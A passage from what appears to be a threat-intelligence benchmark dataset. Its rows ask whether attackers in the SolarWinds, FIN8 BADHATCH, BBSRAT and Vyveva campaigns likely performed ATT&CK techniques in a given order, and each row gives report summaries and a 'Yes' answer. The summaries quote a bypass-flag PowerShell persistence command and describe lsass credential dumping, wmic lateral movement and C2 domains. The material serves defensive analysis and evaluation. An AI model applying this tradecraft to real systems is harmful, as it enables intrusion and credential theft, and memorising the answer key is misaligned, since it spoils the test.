Resource Development: The report indicates that the threat actors behind the SolarWinds Orion platform compromise, referred to as UNC2452, demonstrated significant Resource Development capabilities. They were selective in their targeting, choosing specific organizations to pursue while excluding others. The report suggests adding the ATT&CK sub-technique T1583.001 Acquire Infrastructure: Domains to the UNC2452 actor profile, as the actors parked domains for future use. Additionally, the report notes that the attackers may have had access to private web servers and developed malware capabilities.
Initial Access: The report discusses the Initial Access tactic in the context of the SolarWinds Orion platform compromise. It highlights that the attackers used a supply chain compromise, specifically a compromised software update, as their initial access vector. This technique is listed as T1195 Supply Chain Compromise, with the sub-technique T1195.002 Compromise Software Supply Chain.
Execution: The report mentions that the threat actors used various Execution techniques, including T1072 Software Deployment Tools, to run malicious code as part of their operations. Additionally, the attackers used system services to execute code, as indicated by the technique T1569 System Services.
Persistence: The report does not provide specific details on Persistence techniques used by the threat actors. However, it implies that the attackers were able to maintain their foothold within the compromised networks by being selective in their targeting and careful to avoid detection.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by the threat actors. However, it suggests that the attackers had a high level of system access, which may imply the use of techniques to gain elevated permissions.
Credential Access: The report does not provide specific details on Credential Access techniques used by the threat actors. However, the use of valid accounts (T1078) is mentioned, suggesting that the attackers may have had access to legitimate credentials to facilitate their operations.
Discovery: The report mentions Discovery techniques such as T1057 Process Discovery and T1012 Query Registry, which the threat actors used to gain knowledge about the systems and internal network of the compromised organizations.
Lateral Movement: The report does not provide specific details on Lateral Movement techniques used by the threat actors. However, it suggests that the attackers were able to move through the network to reach their objectives, which may involve the use of techniques to control remote systems.
Collection: The report does not provide specific details on Collection techniques used by the threat actors. However, it mentions that the attackers were focused on information theft and espionage, which implies the use of techniques to gather data relevant to their goals.
Command and Control: The report discusses Command and Control techniques, including T1071 Application Layer Protocol and T1568 Dynamic Resolution, which the threat actors used to communicate with the compromised systems and maintain control over them.
Exfiltration: The report does not provide specific details on Exfiltration techniques used by the threat actors. However, it mentions that the attackers were likely focused on stealing data, which suggests the use of techniques to remove data from the target network.
Impact: The report does not provide specific details on Impact techniques used by the threat actors. However, it suggests that the primary goal of the attackers was espionage rather than destruction, indicating that impact techniques may not have been a focus of this campaign.
Others: The report provides an analysis of the SolarWinds Orion platform compromise, discussing the attribution challenges and the possibility of multiple actors being involved. It highlights the need for further investigation and intelligence analysis to understand the full scope of the campaign and the actors behind it. The report also emphasizes the importance of using frameworks like MITRE ATT&CK for mapping adversary TTPs and improving defensive strategies.",Yes,pov-2020-1230
351,146,146-Defense Evasion-T1497-Virtualization/Sandbox Evasion,"After threat actors utilized a compromised software update as an initial access vector through a supply chain compromise, is it likely that they demonstrated sophisticated Defense Evasion techniques, such as Virtualization/Sandbox Evasion, before conducting Discovery efforts like Process Discovery and Query Registry to gain system insights?","Defense Evasion: The report details several Defense Evasion techniques used by the threat actors, including T1070 Indicator Removal on Host, T1036 Masquerading, T1553 Subvert Trust Controls, and T1497 Virtualization/Sandbox Evasion. The attackers took great care to avoid detection by security tools and personnel, demonstrating a high level of sophistication in evading defenses.","Reconnaissance: The report does not provide explicit details on the Reconnaissance tactics used by the threat actors involved in the SolarWinds Orion platform compromise. However, it mentions that the attackers demonstrated an impressive degree of reconnaissance and focus, suggesting that they had intimate knowledge of SolarWinds' source code, network topology, and internal development domain names. This knowledge was used to minimize the risk of detection by vigilant employees.
Resource Development: The report indicates that the threat actors behind the SolarWinds Orion platform compromise, referred to as UNC2452, demonstrated significant Resource Development capabilities. They were selective in their targeting, choosing specific organizations to pursue while excluding others. The report suggests adding the ATT&CK sub-technique T1583.001 Acquire Infrastructure: Domains to the UNC2452 actor profile, as the actors parked domains for future use. Additionally, the report notes that the attackers may have had access to private web servers and developed malware capabilities.
Initial Access: The report discusses the Initial Access tactic in the context of the SolarWinds Orion platform compromise. It highlights that the attackers used a supply chain compromise, specifically a compromised software update, as their initial access vector. This technique is listed as T1195 Supply Chain Compromise, with the sub-technique T1195.002 Compromise Software Supply Chain.
Execution: The report mentions that the threat actors used various Execution techniques, including T1072 Software Deployment Tools, to run malicious code as part of their operations. Additionally, the attackers used system services to execute code, as indicated by the technique T1569 System Services.
Persistence: The report does not provide specific details on Persistence techniques used by the threat actors. However, it implies that the attackers were able to maintain their foothold within the compromised networks by being selective in their targeting and careful to avoid detection.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by the threat actors. However, it suggests that the attackers had a high level of system access, which may imply the use of techniques to gain elevated permissions.
Credential Access: The report does not provide specific details on Credential Access techniques used by the threat actors. However, the use of valid accounts (T1078) is mentioned, suggesting that the attackers may have had access to legitimate credentials to facilitate their operations.
Discovery: The report mentions Discovery techniques such as T1057 Process Discovery and T1012 Query Registry, which the threat actors used to gain knowledge about the systems and internal network of the compromised organizations.
Lateral Movement: The report does not provide specific details on Lateral Movement techniques used by the threat actors. However, it suggests that the attackers were able to move through the network to reach their objectives, which may involve the use of techniques to control remote systems.
Collection: The report does not provide specific details on Collection techniques used by the threat actors. However, it mentions that the attackers were focused on information theft and espionage, which implies the use of techniques to gather data relevant to their goals.
Command and Control: The report discusses Command and Control techniques, including T1071 Application Layer Protocol and T1568 Dynamic Resolution, which the threat actors used to communicate with the compromised systems and maintain control over them.
Exfiltration: The report does not provide specific details on Exfiltration techniques used by the threat actors. However, it mentions that the attackers were likely focused on stealing data, which suggests the use of techniques to remove data from the target network.
Impact: The report does not provide specific details on Impact techniques used by the threat actors. However, it suggests that the primary goal of the attackers was espionage rather than destruction, indicating that impact techniques may not have been a focus of this campaign.
Others: The report provides an analysis of the SolarWinds Orion platform compromise, discussing the attribution challenges and the possibility of multiple actors being involved. It highlights the need for further investigation and intelligence analysis to understand the full scope of the campaign and the actors behind it. The report also emphasizes the importance of using frameworks like MITRE ATT&CK for mapping adversary TTPs and improving defensive strategies.",Yes,pov-2020-1230
364,147,147-Discovery-T1057-Process Discovery,"After using commands like systeminfo.exe, ipconfig.exe, net.exe, whoami.exe, and netstat.exe for system fingerprinting, is it likely that the attackers will utilize tasklist.exe for process discovery before performing domain trust discovery with tools like nltest.exe and ping.exe?","Discovery: The attackers conducted system fingerprinting using commands like systeminfo.exe, tasklist.exe, ipconfig.exe, net.exe, whoami.exe, and netstat.exe. They also discovered the Domain Controller and performed domain trust discovery using commands like nltest.exe and ping.exe.","Initial Access: The FIN8 group, known for targeting retail, hospitality, and entertainment sectors, has been observed using a backdoor called BADHATCH to gain initial access to networks. The latest version of BADHATCH, v2.14, uses a malicious PowerShell command line to download and execute a script from a domain mapped by the sslip.io service, which is abused to evade detection. The script, identified by a hash value, employs base64 representations of shellcode for different architectures and uses a .NET binary to execute the shellcode in memory.
Execution: BADHATCH, once executed, can operate in two modes: CMD or POWERSHELL. In POWERSHELL mode, it launches powershell.exe with a command line that executes commands from a pipe using IEX. It supports custom commands such as info, Ping-Comp, Check-Port, Check-Share, psx, and GetComputerInfo. In CMD mode, it uses cmd.exe to execute a different set of commands, including spawn, proxy local, proxy bc, proxy status, ftp, steal, revert, and eventlog.
Persistence: FIN8 ensures persistence by using the WMI event subscription mechanism. A PowerShell script, indicated by the command line 'powershell.exe -nop -ep bypass -c c:\windows\temp\m.ps1 f9eef8b27ff68f41a8eb0b8739370640', sets up an event consumer named PerfData with a command line associated with it. This involves creating a WMI object named Win32_Base64Class with a property 'Prop' containing a base64 string of a .NET binary, which creates a svchost.exe process for code injection.
Privilege Escalation: The deployment of BADHATCH involves privilege escalation, as indicated by the execution of a script named sh-tmp.ps1, which likely escalates privileges since subsequent commands are executed on behalf of the SYSTEM user. The exact method of privilege escalation is not detailed, but it is associated with the use of the SYSTEM token and potentially involves impersonating tokens of processes like lsass.exe.
Defense Evasion: BADHATCH employs various defense evasion techniques, including the use of TLS encryption to conceal PowerShell commands and masquerading its communication with the C&C server as legitimate HTTP requests. It also uses a proxy to perform TLS encryption and redirection of decrypted data to the actual C&C application.
Credential Access: Credential dumping is suggested by the execution of a script named mimi.ps1, which is speculated to be related to Mimikatz. This is supported by telemetry data indicating that the PowerShell process read the memory of lsass.exe, which is a common target for credential dumping.
Lateral Movement: Lateral movement to the Domain Controller was achieved using wmic.exe to create a process on the DC and execute the BADHATCH deployment script. The output redirection to a local ADMIN$ share suggests the use of the wmiexec.py tool from Impacket.
Others: FIN8 has targeted victims in various countries, including the United States, Canada, South Africa, Puerto Rico, Panama, and Italy, across industries such as insurance, retail, technology, and chemicals. Bitdefender recommends separating POS networks, cybersecurity awareness training, integrating threat intelligence, and considering outsourcing security operations to Managed Detection and Response providers.",Yes,Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN
365,147,147-Discovery-T1016-System Network Configuration Discovery,"After using wmic.exe to create a process on the Domain Controller for lateral movement, is it likely that FIN8 will conduct system fingerprinting via commands like systeminfo.exe and net.exe before determining the system network configuration using tools such as ipconfig.exe and ping.exe?","Discovery: The attackers conducted system fingerprinting using commands like systeminfo.exe, tasklist.exe, ipconfig.exe, net.exe, whoami.exe, and netstat.exe. They also discovered the Domain Controller and performed domain trust discovery using commands like nltest.exe and ping.exe.","Initial Access: The FIN8 group, known for targeting retail, hospitality, and entertainment sectors, has been observed using a backdoor called BADHATCH to gain initial access to networks. The latest version of BADHATCH, v2.14, uses a malicious PowerShell command line to download and execute a script from a domain mapped by the sslip.io service, which is abused to evade detection. The script, identified by a hash value, employs base64 representations of shellcode for different architectures and uses a .NET binary to execute the shellcode in memory.
Execution: BADHATCH, once executed, can operate in two modes: CMD or POWERSHELL. In POWERSHELL mode, it launches powershell.exe with a command line that executes commands from a pipe using IEX. It supports custom commands such as info, Ping-Comp, Check-Port, Check-Share, psx, and GetComputerInfo. In CMD mode, it uses cmd.exe to execute a different set of commands, including spawn, proxy local, proxy bc, proxy status, ftp, steal, revert, and eventlog.
Persistence: FIN8 ensures persistence by using the WMI event subscription mechanism. A PowerShell script, indicated by the command line 'powershell.exe -nop -ep bypass -c c:\windows\temp\m.ps1 f9eef8b27ff68f41a8eb0b8739370640', sets up an event consumer named PerfData with a command line associated with it. This involves creating a WMI object named Win32_Base64Class with a property 'Prop' containing a base64 string of a .NET binary, which creates a svchost.exe process for code injection.
Privilege Escalation: The deployment of BADHATCH involves privilege escalation, as indicated by the execution of a script named sh-tmp.ps1, which likely escalates privileges since subsequent commands are executed on behalf of the SYSTEM user. The exact method of privilege escalation is not detailed, but it is associated with the use of the SYSTEM token and potentially involves impersonating tokens of processes like lsass.exe.
Defense Evasion: BADHATCH employs various defense evasion techniques, including the use of TLS encryption to conceal PowerShell commands and masquerading its communication with the C&C server as legitimate HTTP requests. It also uses a proxy to perform TLS encryption and redirection of decrypted data to the actual C&C application.
Credential Access: Credential dumping is suggested by the execution of a script named mimi.ps1, which is speculated to be related to Mimikatz. This is supported by telemetry data indicating that the PowerShell process read the memory of lsass.exe, which is a common target for credential dumping.
Lateral Movement: Lateral movement to the Domain Controller was achieved using wmic.exe to create a process on the DC and execute the BADHATCH deployment script. The output redirection to a local ADMIN$ share suggests the use of the wmiexec.py tool from Impacket.
Others: FIN8 has targeted victims in various countries, including the United States, Canada, South Africa, Puerto Rico, Panama, and Italy, across industries such as insurance, retail, technology, and chemicals. Bitdefender recommends separating POS networks, cybersecurity awareness training, integrating threat intelligence, and considering outsourcing security operations to Managed Detection and Response providers.",Yes,Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN
366,147,147-Discovery-T1033-System Owner/User Discovery,"After gaining initial access by downloading and executing a script from a domain mapped by the sslip.io service and leveraging BADHATCH to execute commands in CMD or POWERSHELL mode, is it likely that the attackers will use commands like whoami.exe to perform system owner/user discovery before conducting domain trust discovery using tools such as nltest.exe and ping.exe?","Discovery: The attackers conducted system fingerprinting using commands like systeminfo.exe, tasklist.exe, ipconfig.exe, net.exe, whoami.exe, and netstat.exe. They also discovered the Domain Controller and performed domain trust discovery using commands like nltest.exe and ping.exe.","Initial Access: The FIN8 group, known for targeting retail, hospitality, and entertainment sectors, has been observed using a backdoor called BADHATCH to gain initial access to networks. The latest version of BADHATCH, v2.14, uses a malicious PowerShell command line to download and execute a script from a domain mapped by the sslip.io service, which is abused to evade detection. The script, identified by a hash value, employs base64 representations of shellcode for different architectures and uses a .NET binary to execute the shellcode in memory.
Execution: BADHATCH, once executed, can operate in two modes: CMD or POWERSHELL. In POWERSHELL mode, it launches powershell.exe with a command line that executes commands from a pipe using IEX. It supports custom commands such as info, Ping-Comp, Check-Port, Check-Share, psx, and GetComputerInfo. In CMD mode, it uses cmd.exe to execute a different set of commands, including spawn, proxy local, proxy bc, proxy status, ftp, steal, revert, and eventlog.
Persistence: FIN8 ensures persistence by using the WMI event subscription mechanism. A PowerShell script, indicated by the command line 'powershell.exe -nop -ep bypass -c c:\windows\temp\m.ps1 f9eef8b27ff68f41a8eb0b8739370640', sets up an event consumer named PerfData with a command line associated with it. This involves creating a WMI object named Win32_Base64Class with a property 'Prop' containing a base64 string of a .NET binary, which creates a svchost.exe process for code injection.
Privilege Escalation: The deployment of BADHATCH involves privilege escalation, as indicated by the execution of a script named sh-tmp.ps1, which likely escalates privileges since subsequent commands are executed on behalf of the SYSTEM user. The exact method of privilege escalation is not detailed, but it is associated with the use of the SYSTEM token and potentially involves impersonating tokens of processes like lsass.exe.
Defense Evasion: BADHATCH employs various defense evasion techniques, including the use of TLS encryption to conceal PowerShell commands and masquerading its communication with the C&C server as legitimate HTTP requests. It also uses a proxy to perform TLS encryption and redirection of decrypted data to the actual C&C application.
Credential Access: Credential dumping is suggested by the execution of a script named mimi.ps1, which is speculated to be related to Mimikatz. This is supported by telemetry data indicating that the PowerShell process read the memory of lsass.exe, which is a common target for credential dumping.
Lateral Movement: Lateral movement to the Domain Controller was achieved using wmic.exe to create a process on the DC and execute the BADHATCH deployment script. The output redirection to a local ADMIN$ share suggests the use of the wmiexec.py tool from Impacket.
Others: FIN8 has targeted victims in various countries, including the United States, Canada, South Africa, Puerto Rico, Panama, and Italy, across industries such as insurance, retail, technology, and chemicals. Bitdefender recommends separating POS networks, cybersecurity awareness training, integrating threat intelligence, and considering outsourcing security operations to Managed Detection and Response providers.",Yes,Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN
367,147,147-Discovery-T1049-System Network Connections Discovery,"After escalating privileges using the SYSTEM token and potentially impersonating tokens of processes like lsass.exe, is it likely that FIN8 will use commands such as ipconfig.exe, systeminfo.exe, and net.exe for system fingerprinting before employing netstat.exe to carry out system network connections discovery?","Discovery: The attackers conducted system fingerprinting using commands like systeminfo.exe, tasklist.exe, ipconfig.exe, net.exe, whoami.exe, and netstat.exe. They also discovered the Domain Controller and performed domain trust discovery using commands like nltest.exe and ping.exe.","Initial Access: The FIN8 group, known for targeting retail, hospitality, and entertainment sectors, has been observed using a backdoor called BADHATCH to gain initial access to networks. The latest version of BADHATCH, v2.14, uses a malicious PowerShell command line to download and execute a script from a domain mapped by the sslip.io service, which is abused to evade detection. The script, identified by a hash value, employs base64 representations of shellcode for different architectures and uses a .NET binary to execute the shellcode in memory.
Execution: BADHATCH, once executed, can operate in two modes: CMD or POWERSHELL. In POWERSHELL mode, it launches powershell.exe with a command line that executes commands from a pipe using IEX. It supports custom commands such as info, Ping-Comp, Check-Port, Check-Share, psx, and GetComputerInfo. In CMD mode, it uses cmd.exe to execute a different set of commands, including spawn, proxy local, proxy bc, proxy status, ftp, steal, revert, and eventlog.
Persistence: FIN8 ensures persistence by using the WMI event subscription mechanism. A PowerShell script, indicated by the command line 'powershell.exe -nop -ep bypass -c c:\windows\temp\m.ps1 f9eef8b27ff68f41a8eb0b8739370640', sets up an event consumer named PerfData with a command line associated with it. This involves creating a WMI object named Win32_Base64Class with a property 'Prop' containing a base64 string of a .NET binary, which creates a svchost.exe process for code injection.
Privilege Escalation: The deployment of BADHATCH involves privilege escalation, as indicated by the execution of a script named sh-tmp.ps1, which likely escalates privileges since subsequent commands are executed on behalf of the SYSTEM user. The exact method of privilege escalation is not detailed, but it is associated with the use of the SYSTEM token and potentially involves impersonating tokens of processes like lsass.exe.
Defense Evasion: BADHATCH employs various defense evasion techniques, including the use of TLS encryption to conceal PowerShell commands and masquerading its communication with the C&C server as legitimate HTTP requests. It also uses a proxy to perform TLS encryption and redirection of decrypted data to the actual C&C application.
Credential Access: Credential dumping is suggested by the execution of a script named mimi.ps1, which is speculated to be related to Mimikatz. This is supported by telemetry data indicating that the PowerShell process read the memory of lsass.exe, which is a common target for credential dumping.
Lateral Movement: Lateral movement to the Domain Controller was achieved using wmic.exe to create a process on the DC and execute the BADHATCH deployment script. The output redirection to a local ADMIN$ share suggests the use of the wmiexec.py tool from Impacket.
Others: FIN8 has targeted victims in various countries, including the United States, Canada, South Africa, Puerto Rico, Panama, and Italy, across industries such as insurance, retail, technology, and chemicals. Bitdefender recommends separating POS networks, cybersecurity awareness training, integrating threat intelligence, and considering outsourcing security operations to Managed Detection and Response providers.",Yes,Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN
369,147,147-Discovery-T1482-Domain Trust Discovery,"After performing credential dumping using a PowerShell script speculated to be related to Mimikatz and reading the memory of lsass.exe, is it likely that the attackers will conduct system fingerprinting and proceed with domain trust discovery using commands like nltest.exe and ping.exe?","Discovery: The attackers conducted system fingerprinting using commands like systeminfo.exe, tasklist.exe, ipconfig.exe, net.exe, whoami.exe, and netstat.exe. They also discovered the Domain Controller and performed domain trust discovery using commands like nltest.exe and ping.exe.","Initial Access: The FIN8 group, known for targeting retail, hospitality, and entertainment sectors, has been observed using a backdoor called BADHATCH to gain initial access to networks. The latest version of BADHATCH, v2.14, uses a malicious PowerShell command line to download and execute a script from a domain mapped by the sslip.io service, which is abused to evade detection. The script, identified by a hash value, employs base64 representations of shellcode for different architectures and uses a .NET binary to execute the shellcode in memory.
Execution: BADHATCH, once executed, can operate in two modes: CMD or POWERSHELL. In POWERSHELL mode, it launches powershell.exe with a command line that executes commands from a pipe using IEX. It supports custom commands such as info, Ping-Comp, Check-Port, Check-Share, psx, and GetComputerInfo. In CMD mode, it uses cmd.exe to execute a different set of commands, including spawn, proxy local, proxy bc, proxy status, ftp, steal, revert, and eventlog.
Persistence: FIN8 ensures persistence by using the WMI event subscription mechanism. A PowerShell script, indicated by the command line 'powershell.exe -nop -ep bypass -c c:\windows\temp\m.ps1 f9eef8b27ff68f41a8eb0b8739370640', sets up an event consumer named PerfData with a command line associated with it. This involves creating a WMI object named Win32_Base64Class with a property 'Prop' containing a base64 string of a .NET binary, which creates a svchost.exe process for code injection.
Privilege Escalation: The deployment of BADHATCH involves privilege escalation, as indicated by the execution of a script named sh-tmp.ps1, which likely escalates privileges since subsequent commands are executed on behalf of the SYSTEM user. The exact method of privilege escalation is not detailed, but it is associated with the use of the SYSTEM token and potentially involves impersonating tokens of processes like lsass.exe.
Defense Evasion: BADHATCH employs various defense evasion techniques, including the use of TLS encryption to conceal PowerShell commands and masquerading its communication with the C&C server as legitimate HTTP requests. It also uses a proxy to perform TLS encryption and redirection of decrypted data to the actual C&C application.
Credential Access: Credential dumping is suggested by the execution of a script named mimi.ps1, which is speculated to be related to Mimikatz. This is supported by telemetry data indicating that the PowerShell process read the memory of lsass.exe, which is a common target for credential dumping.
Lateral Movement: Lateral movement to the Domain Controller was achieved using wmic.exe to create a process on the DC and execute the BADHATCH deployment script. The output redirection to a local ADMIN$ share suggests the use of the wmiexec.py tool from Impacket.
Others: FIN8 has targeted victims in various countries, including the United States, Canada, South Africa, Puerto Rico, Panama, and Italy, across industries such as insurance, retail, technology, and chemicals. Bitdefender recommends separating POS networks, cybersecurity awareness training, integrating threat intelligence, and considering outsourcing security operations to Managed Detection and Response providers.",Yes,Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN
370,147,147-Lateral Movement-T1570-Lateral Tool Transfer,"After conducting system fingerprinting and discovering the Domain Controller using commands like nltest.exe and ping.exe during the Discovery phase, is it likely that the FIN8 group will achieve lateral movement to the Domain Controller using wmic.exe to execute the BADHATCH deployment script, with output redirection suggesting the use of wmiexec.py from Impacket?",Lateral Movement: Lateral movement to the Domain Controller was achieved using wmic.exe to create a process on the DC and execute the BADHATCH deployment script. The output redirection to a local ADMIN$ share suggests the use of the wmiexec.py tool from Impacket.,"Initial Access: The FIN8 group, known for targeting retail, hospitality, and entertainment sectors, has been observed using a backdoor called BADHATCH to gain initial access to networks. The latest version of BADHATCH, v2.14, uses a malicious PowerShell command line to download and execute a script from a domain mapped by the sslip.io service, which is abused to evade detection. The script, identified by a hash value, employs base64 representations of shellcode for different architectures and uses a .NET binary to execute the shellcode in memory.
Execution: BADHATCH, once executed, can operate in two modes: CMD or POWERSHELL. In POWERSHELL mode, it launches powershell.exe with a command line that executes commands from a pipe using IEX. It supports custom commands such as info, Ping-Comp, Check-Port, Check-Share, psx, and GetComputerInfo. In CMD mode, it uses cmd.exe to execute a different set of commands, including spawn, proxy local, proxy bc, proxy status, ftp, steal, revert, and eventlog.
Persistence: FIN8 ensures persistence by using the WMI event subscription mechanism. A PowerShell script, indicated by the command line 'powershell.exe -nop -ep bypass -c c:\windows\temp\m.ps1 f9eef8b27ff68f41a8eb0b8739370640', sets up an event consumer named PerfData with a command line associated with it. This involves creating a WMI object named Win32_Base64Class with a property 'Prop' containing a base64 string of a .NET binary, which creates a svchost.exe process for code injection.
Privilege Escalation: The deployment of BADHATCH involves privilege escalation, as indicated by the execution of a script named sh-tmp.ps1, which likely escalates privileges since subsequent commands are executed on behalf of the SYSTEM user. The exact method of privilege escalation is not detailed, but it is associated with the use of the SYSTEM token and potentially involves impersonating tokens of processes like lsass.exe.
Defense Evasion: BADHATCH employs various defense evasion techniques, including the use of TLS encryption to conceal PowerShell commands and masquerading its communication with the C&C server as legitimate HTTP requests. It also uses a proxy to perform TLS encryption and redirection of decrypted data to the actual C&C application.
Credential Access: Credential dumping is suggested by the execution of a script named mimi.ps1, which is speculated to be related to Mimikatz. This is supported by telemetry data indicating that the PowerShell process read the memory of lsass.exe, which is a common target for credential dumping.
Discovery: The attackers conducted system fingerprinting using commands like systeminfo.exe, tasklist.exe, ipconfig.exe, net.exe, whoami.exe, and netstat.exe. They also discovered the Domain Controller and performed domain trust discovery using commands like nltest.exe and ping.exe.
Others: FIN8 has targeted victims in various countries, including the United States, Canada, South Africa, Puerto Rico, Panama, and Italy, across industries such as insurance, retail, technology, and chemicals. Bitdefender recommends separating POS networks, cybersecurity awareness training, integrating threat intelligence, and considering outsourcing security operations to Managed Detection and Response providers.",Yes,Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN
376,148,148-Exfiltration-T1041-Exfiltration Over C2 Channel,"After BBSRAT establishes command and control communication through HTTP or HTTPS requests with the C2 server and exfiltrates data about the victim's machine, is it likely to observe the malware exfiltrating additional compressed and encrypted data via POST requests to the C2 server?","Exfiltration: The BBSRAT malware exfiltrates data about the victim's machine to the C2 server using POST requests with a custom binary structure. The data is compressed using ZLIB and, if sent via HTTP, an additional encryption algorithm is applied.","Initial Access: The CTI report details an attack campaign targeting Russia and Russian-speaking nations, known as 'Roaming Tiger'. The adversaries used weaponized exploit documents to gain initial access, exploiting the Microsoft Office vulnerability CVE-2012-0158. A spear-phishing email was sent from an impersonated individual of the Russian-based organization Vigstar, containing a malicious document that, once opened, would infect the system and leave a Russian language decoy document.
Execution: The CTI report describes the execution process of the BBSRAT malware. Upon initial execution, the dropper generates a path in the %TEMP% directory and writes an embedded cab file. It then creates directories based on the Windows version and uses the expand.exe utility to write three files to the SSONSVR directory: aclmain.sdb, pnipcn.dll, and ssonsvr.exe. The legitimate Citrix executable ssonsvr.exe is used to sideload the malicious pnipcn.dll file, which then identifies the path to msiexec.exe, spawns a suspended instance of it, and performs process hollowing before resuming the process. To ensure persistence, a registry key is written to run ssonsvr.exe on startup.
Persistence: The BBSRAT malware ensures persistence by writing a registry key on the victim's machine to run the ssonsvr.exe file on startup. Additionally, the malware uses a downloader that deploys a DLL to either %SYSTEMROOT%\web\srvcl32.dll or %APPDATA%\web\srvcl32.dll, with corresponding registry keys set to ensure the DLL loads when Windows starts. This technique was previously used by the ZeroAccess rootkit.
Command and Control: The CTI report identifies the command and control (C2) infrastructure used by the BBSRAT malware. Analysis shows that the new samples used the same C2 domains as the 'Roaming Tiger' campaign, including transactiona[.]com and futuresgold[.]com. The C2 domains have significant overlap among the hashes and IPs, but the BBSRAT C2s contain no overlap, suggesting purpose-built variants and infrastructure for each target. BBSRAT communicates with the C2 server using HTTP or HTTPS requests and exfiltrates data about the victim's machine via POST requests.
Others: The CTI report mentions that despite public knowledge of their tactics, techniques, and procedures (TTPs), the adversaries continue to reuse much of their exposed playbook. Organizations are urged to use threat intelligence data proactively to secure themselves and prevent attacks. The report also includes a YARA rule for detecting BBSRAT and a list of identified BBSRAT samples with their associated C2 servers.",Yes,bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger
380,15,15-Execution-T1569-System Services,"Before executing through a service using the Vyveva backdoor, is it likely that Lazarus establishes persistence by creating a new service for its loader and then evades defense mechanisms by decrypting strings and components, timestomping files, and modifying the registry to store configuration?","Execution: ESET researchers discovered a new Lazarus backdoor named Vyveva, which executes via a service (T1569.002) and uses the CreateProcessA API for file execution (T1106).","Persistence: The Vyveva installer creates a new service to establish persistence for its loader (T1543.003).
Defense Evasion: Vyveva decrypts strings and components, including the backdoor and Tor library (T1140), can timestomp files (T1070.006), masquerades tasks or services (T1036.004), modifies the registry to store its configuration (T1112), and has encrypted strings and components (T1027).
Discovery: Vyveva's backdoor can obtain file and directory listings (T1083), list running processes (T1057), obtain system information such as computer name, ANSI code page, OS version and architecture (T1082), obtain the local IP address (T1016), and system time and time zone (T1124).
Collection: Vyveva's backdoor can compress files with zlib before sending to C&C (T1560.002), collect files from the computer (T1005), and notify C&C about newly inserted removable media and collect files from them (T1025).
Command and Control: Vyveva's backdoor encrypts C&C traffic using XOR (T1573.001), communicates with C&C via Tor (T1573.002), and exfiltrates data to the C&C server (T1041).
Exfiltration: Vyveva exfiltrates data to its C&C server (T1041).
Others: ESET researchers identified a previously undocumented backdoor used by Lazarus to attack a freight logistics company in South Africa. The backdoor, named Vyveva, communicates with its C&C server via the Tor network and has been active since at least December 2018. It features capabilities for file exfiltration, timestomping, and gathering victim information. The initial compromise vector is unknown, but telemetry data suggests targeted deployment. Vyveva shares code similarities with older Lazarus samples detected as the NukeSped malware family, indicating high confidence in attribution to Lazarus. The backdoor's components include an installer, loader, and main payload, with the installer ensuring persistence and storing configuration in the registry. Vyveva's backdoor executes 23 commands, including file upload and timestomping, and features drive and session watchdogs. The configuration is modifiable by C&C commands and includes fields for connection delay and encrypted C&C server strings. The Tor library is used for C&C communication, with the backdoor's export directory containing TorSocket.dll. The attack on a South African company demonstrates Lazarus's broad geographical targeting.",Yes,"(Are you) afreight of the dark_ Watch out for Vyveva, new Lazarus backdoor _ WeLiveSecurity"
381,15,15-Execution-T1106-Native API,"After Vyveva establishes persistence by creating a new service for its loader, is it likely that it will execute using the CreateProcessA API before performing defense evasion such as decrypting strings and components, including the backdoor and Tor library?","Execution: ESET researchers discovered a new Lazarus backdoor named Vyveva, which executes via a service (T1569.002) and uses the CreateProcessA API for file execution (T1106).","Persistence: The Vyveva installer creates a new service to establish persistence for its loader (T1543.003).
Defense Evasion: Vyveva decrypts strings and components, including the backdoor and Tor library (T1140), can timestomp files (T1070.006), masquerades tasks or services (T1036.004), modifies the registry to store its configuration (T1112), and has encrypted strings and components (T1027).
Discovery: Vyveva's backdoor can obtain file and directory listings (T1083), list running processes (T1057), obtain system information such as computer name, ANSI code page, OS version and architecture (T1082), obtain the local IP address (T1016), and system time and time zone (T1124).
Collection: Vyveva's backdoor can compress files with zlib before sending to C&C (T1560.002), collect files from the computer (T1005), and notify C&C about newly inserted removable media and collect files from them (T1025).
Command and Control: Vyveva's backdoor encrypts C&C traffic using XOR (T1573.001), communicates with C&C via Tor (T1573.002), and exfiltrates data to the C&C server (T1041).
Exfiltration: Vyveva exfiltrates data to its C&C server (T1041).
Others: ESET researchers identified a previously undocumented backdoor used by Lazarus to attack a freight logistics company in South Africa. The backdoor, named Vyveva, communicates with its C&C server via the Tor network and has been active since at least December 2018. It features capabilities for file exfiltration, timestomping, and gathering victim information. The initial compromise vector is unknown, but telemetry data suggests targeted deployment. Vyveva shares code similarities with older Lazarus samples detected as the NukeSped malware family, indicating high confidence in attribution to Lazarus. The backdoor's components include an installer, loader, and main payload, with the installer ensuring persistence and storing configuration in the registry. Vyveva's backdoor executes 23 commands, including file upload and timestomping, and features drive and session watchdogs. The configuration is modifiable by C&C commands and includes fields for connection delay and encrypted C&C server strings. The Tor library is used for C&C communication, with the backdoor's export directory containing TorSocket.dll. The attack on a South African company demonstrates Lazarus's broad geographical targeting.",Yes,"(Are you) afreight of the dark_ Watch out for Vyveva, new Lazarus backdoor _ WeLiveSecurity"
383,15,15-Defense Evasion-T1140-Deobfuscate/Decode Files or Information,"After establishing persistence by creating a new service for its loader, is Vyveva likely to perform file and component decryption for defense evasion before obtaining system information such as computer name, OS version, and architecture for discovery purposes?","Defense Evasion: Vyveva decrypts strings and components, including the backdoor and Tor library (T1140), can timestomp files (T1070.006), masquerades tasks or services (T1036.004), modifies the registry to store its configuration (T1112), and has encrypted strings and components (T1027).","Execution: ESET researchers discovered a new Lazarus backdoor named Vyveva, which executes via a service (T1569.002) and uses the CreateProcessA API for file execution (T1106).
Persistence: The Vyveva installer creates a new service to establish persistence for its loader (T1543.003).
Discovery: Vyveva's backdoor can obtain file and directory listings (T1083), list running processes (T1057), obtain system information such as computer name, ANSI code page, OS version and architecture (T1082), obtain the local IP address (T1016), and system time and time zone (T1124).
Collection: Vyveva's backdoor can compress files with zlib before sending to C&C (T1560.002), collect files from the computer (T1005), and notify C&C about newly inserted removable media and collect files from them (T1025).
